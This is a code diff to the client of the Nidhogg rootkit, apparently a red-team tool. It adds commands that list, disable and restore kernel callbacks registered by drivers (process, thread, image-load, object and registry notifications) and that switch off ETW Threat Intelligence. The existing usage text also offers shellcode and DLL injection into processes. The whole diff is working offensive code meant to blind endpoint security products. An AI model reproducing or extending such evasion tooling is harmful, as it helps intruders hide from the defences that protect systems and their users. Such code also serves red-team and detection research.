@@ -20,6 +20,8 @@ void PrintUsage() {
 	std::cout << "\tNidhoggClient.exe [write | read] [pid] [remote address] [size] [mode]" << std::endl;
 	std::cout << "\tNidhoggClient.exe shinject [apc | thread] [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
 	std::cout << "\tNidhoggClient.exe dllinject [apc | thread] [pid] [dll path]" << std::endl;
+	std::cout << "\tNidhoggClient.exe callbacks [query | remove | restore] [callback type] [callback address]" << std::endl;
+	std::cout << "\tNidhoggClient.exe etwti [enable | disable]" << std::endl;
 }
 
 int Error(int errorCode) {
@@ -91,9 +93,9 @@ int wmain(int argc, const wchar_t* argv[]) {
 	if (argc < 3)
 		return Error(NIDHOGG_INVALID_COMMAND);
 
-	if (_wcsicmp(argv[2], L"add") == 0)
+	if (_wcsicmp(argv[2], L"add") == 0 || _wcsicmp(argv[2], L"restore") == 0 || _wcsicmp(argv[2], L"enable") == 0)
 		option = Options::Add;
-	else if (_wcsicmp(argv[2], L"remove") == 0)
+	else if (_wcsicmp(argv[2], L"remove") == 0 || _wcsicmp(argv[2], L"disable") == 0)
 		option = Options::Remove;
 	else if (_wcsicmp(argv[2], L"clear") == 0)
 		option = Options::Clear;
@@ -147,6 +149,34 @@ int wmain(int argc, const wchar_t* argv[]) {
 					success = Nidhogg::RegistryUtils::NidhoggRegistryProtectKey(hNidhogg, _wcsdup(argv[3]));
 				}
 			}
+			else if (_wcsicmp(argv[1], L"etwti") == 0)
+				success = Nidhogg::AntiAnalysis::NidhoggEnableDisableEtwTi(hNidhogg, true);
+			else if (_wcsicmp(argv[1], L"callbacks") == 0) {
+				CallbackType callbackType;
+				ULONG64 address = 0;
+
+				if (_wcsicmp(argv[3], L"ObProcessType") == 0)
+					callbackType = ObProcessType;
+				else if (_wcsicmp(argv[3], L"ObThreadType") == 0)
+					callbackType = ObThreadType;
+				else if (_wcsicmp(argv[3], L"PsProcessType") == 0)
+					callbackType = PsCreateProcessType;
+				else if (_wcsicmp(argv[3], L"PsProcessTypeEx") == 0)
+					callbackType = PsCreateProcessTypeEx;
+				else if (_wcsicmp(argv[3], L"PsCreateThreadType") == 0)
+					callbackType = PsCreateThreadType;
+				else if (_wcsicmp(argv[3], L"PsCreateThreadTypeNonSystemThread") == 0)
+					callbackType = PsCreateThreadTypeNonSystemThread;
+				else if (_wcsicmp(argv[3], L"PsImageLoadType") == 0)
+					callbackType = PsImageLoadType;
+				else {
+					success = NIDHOGG_INVALID_OPTION;
+					break;
+				}
+				std::wistringstream iss(argv[4]);
+				iss >> address;
+				success = Nidhogg::AntiAnalysis::NidhoggRestoreCallback(hNidhogg, address, callbackType);
+			}
 			else {
 				success = NIDHOGG_INVALID_OPTION;
 			}
@@ -171,6 +201,34 @@ int wmain(int argc, const wchar_t* argv[]) {
 				else {
 					success = Nidhogg::RegistryUtils::NidhoggRegistryUnprotectKey(hNidhogg, _wcsdup(argv[3]));
 				}
+			}
+			else if (_wcsicmp(argv[1], L"etwti") == 0)
+				success = Nidhogg::AntiAnalysis::NidhoggEnableDisableEtwTi(hNidhogg, false);
+			else if (_wcsicmp(argv[1], L"callbacks") == 0) {
+				CallbackType callbackType;
+				ULONG64 address = 0;
+
+				if (_wcsicmp(argv[3], L"ObProcessType") == 0)
+					callbackType = ObProcessType;
+				else if (_wcsicmp(argv[3], L"ObThreadType") == 0)
+					callbackType = ObThreadType;
+				else if (_wcsicmp(argv[3], L"PsProcessType") == 0)
+					callbackType = PsCreateProcessType;
+				else if (_wcsicmp(argv[3], L"PsProcessTypeEx") == 0)
+					callbackType = PsCreateProcessTypeEx;
+				else if (_wcsicmp(argv[3], L"PsCreateThreadType") == 0)
+					callbackType = PsCreateThreadType;
+				else if (_wcsicmp(argv[3], L"PsCreateThreadTypeNonSystemThread") == 0)
+					callbackType = PsCreateThreadTypeNonSystemThread;
+				else if (_wcsicmp(argv[3], L"PsImageLoadType") == 0)
+					callbackType = PsImageLoadType;
+				else {
+					success = NIDHOGG_INVALID_OPTION;
+					break;
+				}
+				std::wistringstream iss(argv[4]);
+				iss >> address;
+				success = Nidhogg::AntiAnalysis::NidhoggDisableCallback(hNidhogg, address, callbackType);
 			}
 			else {
 				success = NIDHOGG_INVALID_OPTION;
@@ -396,6 +454,95 @@ int wmain(int argc, const wchar_t* argv[]) {
 				}
 				else {
 					success = NIDHOGG_INVALID_OPTION;
+				}
+			}
+
+			else if (_wcsicmp(argv[1], L"callbacks") == 0) {
+				if (argc != 4) {
+					success = NIDHOGG_INVALID_OPTION;
+					break;
+				}
+				CallbackType callbackType;
+
+				if (_wcsicmp(argv[3], L"ObProcessType") == 0)
+					callbackType = ObProcessType;
+				else if (_wcsicmp(argv[3], L"ObThreadType") == 0)
+					callbackType = ObThreadType;
+				else if (_wcsicmp(argv[3], L"PsProcessType") == 0)
+					callbackType = PsCreateProcessType;
+				else if (_wcsicmp(argv[3], L"PsProcessTypeEx") == 0)
+					callbackType = PsCreateProcessTypeEx;
+				else if (_wcsicmp(argv[3], L"PsCreateThreadType") == 0)
+					callbackType = PsCreateThreadType;
+				else if (_wcsicmp(argv[3], L"PsCreateThreadTypeNonSystemThread") == 0)
+					callbackType = PsCreateThreadTypeNonSystemThread;
+				else if (_wcsicmp(argv[3], L"PsImageLoadType") == 0)
+					callbackType = PsImageLoadType;
+				else if (_wcsicmp(argv[3], L"CmRegistryType") == 0)
+					callbackType = CmRegistryType;
+				else {
+					success = NIDHOGG_INVALID_OPTION;
+					break;
+				}
+
+				if (callbackType == ObProcessType || callbackType == ObThreadType) {
+					ObCallbacksList callbacks{};
+					ObCallback currentCallback;
+
+					callbacks = Nidhogg::AntiAnalysis::NidhoggListObCallbacks(hNidhogg, callbackType, &success);
+
+					if (success == NIDHOGG_SUCCESS) {
+						for (int i = 0; i < callbacks.NumberOfCallbacks; i++) {
+							currentCallback = callbacks.Callbacks[i];
+
+							if (currentCallback.DriverName)
+								std::cout << "Driver Name: " << currentCallback.DriverName << std::endl;
+							else
+								std::cout << "Driver Name: Unknown" << std::endl;
+							std::cout << "\tPre operation callback: " << std::hex << currentCallback.PreOperation << std::endl;
+							std::cout << "\tPost operation callback: " << std::hex << currentCallback.PostOperation << std::endl;
+						}
+
+						free(callbacks.Callbacks);
+					}
+				}
+				else if (callbackType == CmRegistryType) {
+					CmCallbacksList callbacks{};
+					CmCallback currentCallback;
+
+					callbacks = Nidhogg::AntiAnalysis::NidhoggListRegistryCallbacks(hNidhogg, &success);
+
+					if (success == NIDHOGG_SUCCESS) {
+						for (int i = 0; i < callbacks.NumberOfCallbacks; i++) {
+							currentCallback = callbacks.Callbacks[i];
+
+							if (currentCallback.DriverName)
+								std::cout << "Driver Name: " << currentCallback.DriverName << std::endl;
+							else
+								std::cout << "Driver Name: Unknown" << std::endl;
+							std::cout << "\tCallback: " << std::hex << currentCallback.CallbackAddress << std::endl;
+							std::cout << "\tContext: " << std::hex << currentCallback.Context << std::endl;
+						}
+
+						free(callbacks.Callbacks);
+					}
+				}
+				else {
+					PsRoutinesList routines{};
+					PsRoutine currentRoutine;
+					routines = Nidhogg::AntiAnalysis::NidhoggListPsRoutines(hNidhogg, callbackType, &success);
+
+					if (success == NIDHOGG_SUCCESS) {
+						for (int i = 0; i < routines.NumberOfRoutines; i++) {
+							currentRoutine = routines.Routines[i];
+
+							if (currentRoutine.DriverName)
+								std::cout << "Driver Name: " << currentRoutine.DriverName << std::endl;
+							else
+								std::cout << "Driver Name: Unknown" << std::endl;
+							std::cout << "\tCallback: " << std::hex << currentRoutine.CallbackAddress << std::endl;
+						}
+					}
 				}
 			}
 
